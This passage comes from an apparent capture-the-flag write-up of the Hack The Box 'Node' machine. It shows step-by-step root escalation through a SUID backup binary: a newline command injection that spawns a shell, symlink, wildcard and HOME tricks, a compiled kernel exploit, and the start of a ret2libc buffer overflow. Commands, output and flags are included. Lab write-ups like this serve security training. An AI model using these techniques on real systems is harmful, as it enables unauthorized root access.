</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827200528.png" alt="" data-proofer-ignore></p><li>Do command injection w/ <code class="language-plaintext highlighter-rouge">'</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> tom@node:/home/mark$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' '
 -&gt; test
 -&gt; /bin/bash
 -&gt; test'
		
 zip error: Nothing to do! (/tmp/.backup_1407478153)
 To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
 See "man sudo_root" for details.
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827200723.png" alt="" data-proofer-ignore></p></ol><li>Root Flag<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> root@node:/home/mark# cat /root/root.txt
 c4e6a08a631d75e4953261b95db28af0
</pre></table></code></div></div></ol><h1 id="privilege-escalation---2">Privilege Escalation - 2</h1><h2 id="root---via-symlink">Root - Via Symlink <a href="#root---via-symlink" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Symlink example<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> tom@node:/tmp$ ln -s /home/tom/user.txt ./symlinkuser.txt
 tom@node:/tmp$ cat symlinkuser.txt 
 e450cd47f4c0854621811c801bd2995e
 tom@node:/tmp$ cat /home/tom/user.txt
 e450cd47f4c0854621811c801bd2995e
 tom@node:/tmp$ 
</pre></table></code></div></div><li>Create symlink<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> # I tried to create symlink at /tmp, it did not work, so i created another dir /tmp/symlink
	
 tom@node:/tmp$ mkdir symlink
 tom@node:/tmp$ cd symlink/
 tom@node:/tmp/symlink$ ln -s /root/root.txt ./symlink
 tom@node:/tmp/symlink$ /usr/local/bin/backup a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508  /tmp/symlink/symlink
	
 UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAATABwAdG1wL3N5bWxpbmsvc3ltbGlua1VUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAABs1Wj5BdvdkagUcO85sE3hEWoJpzDthrbSYdG8ViWPAORPg8rChzckT0DL8LVQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAABMAGAAAAAAAAQAAAKCBAAAAAHRtcC9zeW1saW5rL3N5bWxpbmtVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBZAAAAigAAAAAA
</pre></table></code></div></div><li>Decode &amp; Unzip<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# echo UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAATABwAdG1wL3N5bWxpbmsvc3ltbGlua1VUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAABs1Wj5BdvdkagUcO85sE3hEWoJpzDthrbSYdG8ViWPAORPg8rChzckT0DL8LVQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAABMAGAAAAAAAAQAAAKCBAAAAAHRtcC9zeW1saW5rL3N5bWxpbmtVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBZAAAAigAAAAAA | base64 -d &gt; file.zip
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# unzip file.zip 
 Archive:  file.zip
 [file.zip] tmp/symlink/symlink password: 
  extracting: tmp/symlink/symlink     
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# ls
 backup  file.zip  tmp
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# cd tmp/
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot/tmp/symlink]
 └─# ls
 symlink
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot/tmp/symlink]
 └─# cat symlink 
 d3f8db5b8f5376c577c3d1bec2f05749
</pre></table></code></div></div></ol><h1 id="privilege-escalation---3">Privilege Escalation - 3</h1><h2 id="root---via-wildcard">Root - Via Wildcard <a href="#root---via-wildcard" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Wildcard example<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre> mark@node:/home$ ls -la /home/m* 
 total 24
 drwxr-xr-x 3 root root 4096 Sep  3  2017 .
 drwxr-xr-x 5 root root 4096 Aug 31  2017 ..
 -rw-r--r-- 1 root root  220 Aug 31  2017 .bash_logout
 -rw-r--r-- 1 root root 3771 Aug 31  2017 .bashrc
 drwx------ 2 root root 4096 Aug 31  2017 .cache
 -rw-r----- 1 root root    0 Sep  3  2017 .dbshell
 -rwxr-xr-x 1 root root    0 Sep  3  2017 .mongorc.js
 -rw-r--r-- 1 root root  655 Aug 31  2017 .profile
	
 mark@node:/home$ ls -la /home/m???
 total 24
 drwxr-xr-x 3 root root 4096 Sep  3  2017 .
 drwxr-xr-x 5 root root 4096 Aug 31  2017 ..
 -rw-r--r-- 1 root root  220 Aug 31  2017 .bash_logout
 -rw-r--r-- 1 root root 3771 Aug 31  2017 .bashrc
 drwx------ 2 root root 4096 Aug 31  2017 .cache
 -rw-r----- 1 root root    0 Sep  3  2017 .dbshell
 -rwxr-xr-x 1 root root    0 Sep  3  2017 .mongorc.js
 -rw-r--r-- 1 root root  655 Aug 31  2017 .profile
</pre></table></code></div></div><li>Use wildcards <code class="language-plaintext highlighter-rouge">*</code>,<code class="language-plaintext highlighter-rouge">?</code> to backup <code class="language-plaintext highlighter-rouge">/root</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> tom@node:/tmp$ /usr/local/bin/backup -q 'a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508' /r??t/r??t.txt
 UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAAB9SNH9tpbCMRDf9y6k73Gjma9ED7t2sfalJ1nx76+RqMSHaxCWN2y0WgLKixRQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAAtom@node:/tmp$ 
	
 tom@node:/tmp$ /usr/local/bin/backup -q 'a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508' /roo*/r*.txt
 UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAAD4AUMzd3SN3m0NlZ8xs3cmDskgH0sKWl1rPYRyHW8s+GV0QKqR/mMHogdYuLlQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAAtom@node:/tmp$ 
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827211453.png" alt="" data-proofer-ignore></p><li>Decode &amp; Unzip<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# echo UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAAD4AUMzd3SN3m0NlZ8xs3cmDskgH0sKWl1rPYRyHW8s+GV0QKqR/mMHogdYuLlQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA | base64 -d &gt; root.zip
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# unzip root.zip 
 Archive:  root.zip
 [root.zip] root/root.txt password: 
  extracting: root/root.txt           
 ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# cat ./root/root.txt 
 d3f8db5b8f5376c577c3d1bec2f05749
</pre></table></code></div></div></ol><h1 id="privilege-escalation---4">Privilege Escalation - 4</h1><h2 id="root---via-home-env">Root - Via HOME ENV <a href="#root---via-home-env" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View HOME env<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> tom@node:/tmp$ env | grep HOME
 HOME=/home/tom
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">~</code> = <code class="language-plaintext highlighter-rouge">/home/tom</code><li>We have to change our HOME ENV to <code class="language-plaintext highlighter-rouge">/root</code> so that we can backup <code class="language-plaintext highlighter-rouge">~</code>, inturn backing up <code class="language-plaintext highlighter-rouge">/root</code></ul><li>Change our HOME ENV and backup<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> tom@node:/tmp$ export HOME=/root
     tom@node:/tmp$ /usr/local/bin/backup -q 'a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508' "~"
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827211313.png" alt="" data-proofer-ignore></p><li>Decode and Unzip</ol><h1 id="privilege-escalation---5">Privilege Escalation - 5</h1><h2 id="root---via-root-instead-of-root">Root - Via root instead of /root <a href="#root---via-root-instead-of-root" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><code class="language-plaintext highlighter-rouge">/root</code> is not filtered, proceed to <code class="language-plaintext highlighter-rouge">/</code> and backup <code class="language-plaintext highlighter-rouge">root</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> tom@node:~$ cd /
 tom@node:/$ backup -q 'a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508' root
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827211546.png" alt="" data-proofer-ignore></p><li>Decode and Unzip</ol><h1 id="privilege-escalation---6">Privilege Escalation - 6</h1><h2 id="root---via-kernel-exploit">Root - Via Kernel Exploit <a href="#root---via-kernel-exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Check Linux version<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> tom@node:/tmp$ uname -a
 Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">Linux node 4.4.0-93-generic</code></ul><li>Search for exploits, google <code class="language-plaintext highlighter-rouge">linux 4.40-93 exploit</code><ul><li><a href="https://www.exploit-db.com/exploits/44298">44298.c</a></ul><li>Compile &amp; Exploit<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> tom@node:/tmp$ gcc 44298.c -o exploit; ./exploit
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827212920.png" alt="" data-proofer-ignore></p></ol><h1 id="privilege-escalation---7-bof">Privilege Escalation - 7 (BOF)</h1><h2 id="root---via-bof-ret2libc">Root - Via BOF ret2libc <a href="#root---via-bof-ret2libc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><a href="https://youtu.be/sW10TlZF62w?t=3723">Ippsec Guide</a><li>Idenitify security properties built into <code class="language-plaintext highlighter-rouge">backup</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# checksec backup
 [*] '/root/htb/node/10.10.10.58/loot/backup'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
		
 tom@node:/tmp$  cat /proc/sys/kernel/randomize_va_space
 2
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">NX</code> - Enabled<li><code class="language-plaintext highlighter-rouge">ASLR</code> - Enabled</ul><li>Use <code class="language-plaintext highlighter-rouge">ltrace</code> to intercept and record dynamic library calls by <code class="language-plaintext highlighter-rouge">backup</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> tom@node:/usr/local/bin$ ltrace backup -q '' /home/tom/user.txt
 __libc_start_main(0x80489fd, 4, 0xff9149f4, 0x80492c0 &lt;unfinished ...&gt;
 geteuid()                                                               = 1000
 setuid(1000)                                                            = 0
 strcmp("-q", "-q")                                                      = 0
 strncpy(0xff9148b8, "", 100)                                            = 0xff9148b8
 strcpy(0xff9148a1, "/")                                                 = 0xff9148a1
 strcpy(0xff9148ad, "/")                                                 = 0xff9148ad
 strcpy(0xff914837, "/e")                                                =                                 = nil
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">strcpy</code> is used, allowing bufferoverflow</ul><li>Return to libc attack <strong>bruteforce</strong><ul><li>An attacker overflows a buffer on the process stack with NOP sleds and a <strong>payload</strong> to overwrite the return address (at the end of a function) in such a way that the pointed-to address is somewhere in the NOP sled. The CPU will then slide to the payload and execute it. - <a href="https://nikhilh20.medium.com/return-to-libc-exploit-aa3fe6fb0d69">Source</a><li>Overwrite the return address to an address that points to <code class="language-plaintext highlighter-rouge">system("/bin/bash")</code><li><strong>Bruteforce</strong> because ASLR is enabled &amp; we have unlimited attempts on the binary</ul><li>Use <a href="https://cloud.binary.ninja/">binary ninja</a> to examine <code class="language-plaintext highlighter-rouge">backup</code> to determine the vulnerable function<ol><li>After selecting the binary, click on <code class="language-plaintext highlighter-rouge">strcpy -&gt; displayTarget</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827224510.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">Double-Click</code> to view <code class="language-plaintext highlighter-rouge">displayTarget</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Node/images/Pasted%20image%2020220827223307.png" alt="" data-proofer-ignore><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> sub esp, 0x208 - Make space on ESP (Effective Stack Pointer), 208 (HEX) -&gt; 520 Bytes
</pre></table></code></div></div><ul><li>Able to bufferoverflow at 500-600bytes.<li>We have to figure out how to trigger the displayTarget output <code class="language-plaintext highlighter-rouge">Starting archiving ...</code></ul><li>Figure out how trigger Starting archiving… by playing w/ the options<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre> # Does not trigger it
 tom@node:/tmp$ backup -q 'a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508' /root
  [+] Finished! Encoded backup is below:
		
 UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
		
 # Does not trigger it
 tom@node:/tmp$ backup -q 'a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508' /home/tom/user.txt
 UEsDBAoACQAAAIpQG1V42e7cLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAAxTeCWP69wljdXgLAAEEAAAAAAToAwAAqyveVp3UN3zrXMtAdVW840CnqZI64hHkLBknnJJWuzYa+hiPFcpbtI9Ko5mxUEsHCHjZ7twtAAAAIQAAAFBLAQIeAwoACQAAAIpQG1V42e7cLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQADFN4JY3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA=tom@node:/tmp$ 
		
		
 # Triggers it
 tom@node:/tmp$ backup anything 'a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508' /home/tom/user.txt
		
		
		
              ____________________________________________________
             /                                                    \
            |    _____________________________________________     |
            |   |                                             |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |             Secure Backup v1.0              |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |                                             |    |
            |   |_____________________________________________|    |
            |                                                      |
             \_____________________________________________________/
                    \_______________________________________/
                 _______________________________________________
              _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
           _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
        _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
     _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
  _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
 :-----------------------------------------------------------------------------:
 `---._.-----------------------------------------------------------------._.---'
		
		
  [+] Validated access token
  [+] Starting archiving /home/tom/user.txt
  [+] Finished! Encoded backup is below:
		
 UEsDBAoACQAAAIpQG1V42e7cLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAAxTeCWP69wljdXgLAAEEAAAAAAToAwAAWpvzmHE0Ysg65kU05XfXFaakSKsxcdcTxmdhuIZfdvKj1Ju0o6Sg+SYeqDH3UEsHCHjZ7twtAAAAIQAAAFBLAQIeAwoACQAAAIpQG1V42e7cLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQADFN4JY3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA=
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">-q</code> , must not be there<li><code class="language-plaintext highlighter-rouge">backup &lt;anything&gt; KEY &lt;BOF&gt;</code></ul></ol><li>Buffer Overflow<ol><li>Create pattern<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot]
 └─# msf-pattern_create -l 600
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
</pre></table></code></div></div><li>Determine Pattern Address<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
